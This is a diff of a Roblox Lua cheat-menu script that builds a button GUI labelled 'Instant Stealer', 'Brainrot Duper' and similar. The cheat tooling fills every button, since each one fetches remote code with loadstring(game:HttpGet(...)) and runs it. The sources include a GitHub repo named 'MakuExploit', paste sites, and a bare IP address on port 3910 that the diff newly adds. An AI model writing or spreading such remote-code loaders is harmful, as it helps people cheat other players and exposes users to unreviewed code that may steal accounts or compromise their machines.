@@ -14,7 +14,7 @@ ScreenGui.Parent = CoreGui
 
 -- Smaller Main Frame
 local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 250, 0, 200) -- smaller menu
+Frame.Size = UDim2.new(0, 250, 0, 200)
 Frame.Position = UDim2.new(0.5, -125, 0.5, -100)
 Frame.BackgroundColor3 = Color3.fromRGB(24, 0, 0)
 Frame.BorderSizePixel = 0
@@ -69,7 +69,7 @@ CloseButton.Parent = Frame
 local CloseCorner = Instance.new("UICorner", CloseButton)
 CloseCorner.CornerRadius = UDim.new(0, 8)
 
--- Scrollable Button container
+-- Scrollable Button Container
 local ButtonContainer = Instance.new("ScrollingFrame")
 ButtonContainer.Size = UDim2.new(1, -20, 1, -70)
 ButtonContainer.Position = UDim2.new(0, 10, 0, 50)
@@ -109,7 +109,6 @@ local function createButton(name, text, callback)
     button.MouseEnter:Connect(function()
         TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(120, 0, 0)}):Play()
     end)
-
     button.MouseLeave:Connect(function()
         TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(65, 0, 0)}):Play()
     end)
@@ -117,7 +116,7 @@ local function createButton(name, text, callback)
     button.MouseButton1Click:Connect(callback)
 end
 
--- Your three scripts
+-- Menu Buttons
 createButton("Button1", "Instant Stealer", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/Yohohoho/refs/heads/main/Heheheha"))()
 end)
@@ -130,9 +129,13 @@ createButton("Button3", "Brainrot Duper", function()
     loadstring(game:HttpGet("https://pastefy.app/fI0CcmL4/raw"))()
 end)
 
--- New scrollable button (renamed and formatted)
 createButton("Button4", "For Duping\n(1 Player On Server only)", function()
     loadstring(game:HttpGet("https://pasteapp/Hmd4FmZX/raw"))()
+end)
+
+-- ✅ Added Brainrot Spawner
+createButton("Button5", "Brainrot Spawner", function()
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
 end)
 
 -- Close behavior
